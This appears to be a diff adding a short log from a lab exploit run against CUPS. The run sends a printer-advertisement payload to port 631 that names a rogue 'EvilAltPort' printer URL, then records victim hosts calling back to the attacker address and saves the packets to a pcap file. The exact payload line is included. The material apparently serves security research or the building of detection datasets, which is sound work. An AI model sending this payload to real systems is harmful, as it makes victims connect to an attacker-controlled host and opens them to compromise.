@@ -1,0 +1,6 @@
+2026-11-16 21:06:09,125 INFO sniffing 12s for callbacks (filter: dst host 172.26.0.3 and dst port 12346)
+2026-11-16 21:06:09,627 INFO sending variant=alt-port advertise=172.26.0.3:12346 -> cups:631 payload=b'0 3 http://172.26.0.3:12346/printers/EvilAltPort "Attacker lab" "Evil printer alt port"'
+2026-11-16 21:06:21,146 WARNING CALLBACK: victim 172.26.0.4:40792 initiated TCP to advertised 172.26.0.3:12346
+2026-11-16 21:06:21,146 WARNING CALLBACK: victim 172.26.0.4:38986 initiated TCP to advertised 172.26.0.3:12346
+2026-11-16 21:06:21,146 INFO captured 8 packet(s) after sending
+2026-11-16 21:06:21,152 INFO wrote 9 packet(s) to pcap_files/attack-alt-port.pcap
